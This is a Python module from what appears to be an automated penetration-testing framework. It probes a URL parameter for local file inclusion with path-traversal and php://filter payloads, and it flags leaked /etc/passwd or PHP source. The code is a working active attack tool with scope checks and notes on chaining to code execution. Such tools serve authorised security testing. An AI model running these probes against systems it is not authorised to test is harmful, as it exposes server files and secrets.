"""SkillLfi — Local File Inclusion / Path Traversal probe.

Substitutes the param with directory-traversal payloads in multiple
encoding variants (../ , ..%2f, ..%252f, php://filter for source disclosure)
and looks for OS file content markers in the response.

Severity:
  - critical : /etc/passwd content reflected, or PHP source disclosed via
               php://filter (base64 marker)
  - high     : win.ini or /proc/self/environ leakage
  - info     : nothing
"""
from __future__ import annotations
from typing import Optional
from urllib.parse import urlparse, urlencode, urlunparse, parse_qsl

import requests

from services.skills.base import Skill, SkillResult, register
from services.skills._payloads import LFI_PAYLOADS, LFI_RESPONSE_MARKERS
from services.skills._poc import capture_from_response


_HEADERS = {"User-Agent": "Mozilla/5.0 ZeekGlare-Arena-LFI"}


def _swap(url: str, param: str, value: str) -> str:
    p = urlparse(url)
    qs = parse_qsl(p.query, keep_blank_values=True)
    new_qs = [(k, value if k == param else v) for k, v in qs]
    if not any(k == param for k, _ in qs):
        new_qs.append((param, value))
    return urlunparse((p.scheme, p.netloc, p.path, p.params, urlencode(new_qs), p.fragment))


@register
class SkillLfi(Skill):
    name        = "skill_lfi"
    danger      = "active"
    description = (
        "Probe a URL+param for Local File Inclusion / Path Traversal. Tries "
        "directory traversal payloads in multiple encoding variants (../, "
        "..%2f, double-encoded ..%252f), absolute paths, and PHP wrappers "
        "(file://, php://filter for source disclosure). Looks for OS file "
        "markers (root:x:0:0, [fonts] for Windows, env disclosure)."
    )
    guidance    = (
        "Use on any param that accepts a filename or path-like input — "
        "?file=, ?page=, ?include=, ?template=. PHP apps with `include($_GET['x'])` "
        "are the classic case. The php://filter trick discloses source code "
        "even when the file isn't directly served — base64-decode the response."
    )
    input_schema = {
        "type": "object",
        "properties": {
            "url":   {"type": "string", "description": "URL to probe."},
            "param": {"type": "string", "description": "Param name (e.g. 'file', 'page', 'include')."},
        },
        "required": ["url", "param"],
    }

    @classmethod
    def applicable(cls, state) -> bool:
        c = state.asset_counts()
        return c.get("url", 0) > 0 or c.get("param", 0) > 0

    @classmethod
    def dedup_key(cls, args) -> Optional[tuple[str, str, str, str]]:
        return (args.get("url", ""), args.get("param", ""), "lfi", "traversal")

    @classmethod
    def run(cls, args, state, agent_id) -> SkillResult:
        url   = (args.get("url") or "").strip()
        param = (args.get("param") or "").strip()
        if not url or not param:
            return SkillResult(ok=False, error="url and param required")
        if not state.in_scope(url):
            return SkillResult(ok=False, error=f"out of scope: {url}")

        hits = []
        all_probes = []
        for payload in LFI_PAYLOADS:
            try:
                r = requests.get(_swap(url, param, payload), headers=_HEADERS,
                                 timeout=10, allow_redirects=False, verify=False)
            except Exception as e:
                all_probes.append({"payload": payload, "error": str(e)})
                continue
            body = r.text or ""
            matched = [m for m in LFI_RESPONSE_MARKERS if m in body]
            rec = {"payload": payload, "status": r.status_code,
                   "length": len(body), "matched": matched, "_response": r}
            all_probes.append(rec)
            if matched:
                hits.append(rec)

        if hits:
            best = hits[0]
            poc = capture_from_response(
                best["_response"],
                caption=f"LFI confirmed — payload={best['payload']!r}, "
                        f"matched markers: {best['matched']}"
            )
            sev = "critical" if any(m == "root:x:0:0:" or m.startswith("PD9waHA") for h in hits for m in h["matched"]) else "high"
            return SkillResult(
                ok=True,
                summary=f"LFI confirmed: {len(hits)} payload(s) leaked file content markers.",
                evidence=poc.format(),
                finding={
                    "vuln_type":   "lfi",
                    "severity":    sev,
                    "target":      url,
                    "location":    f"{url} param={param}",
                    "description": (
                        f"Local File Inclusion / Path Traversal — param '{param}' permits "
                        "directory traversal and reads server-side files. Direct file-disclosure "
                        "impact (config files, source code, /etc/passwd). Frequently chains to "
                        "RCE on PHP via log poisoning or wrappers."
                    ),
                    "evidence":    poc.format(),
                },
                extras={"hits": [{k: v for k, v in h.items() if k != "_response"} for h in hits]},
            )

        return SkillResult(
            ok=True,
            summary=f"No LFI detected ({len(all_probes)} payloads tried).",
            extras={"probes_attempted": len(all_probes)},
        )
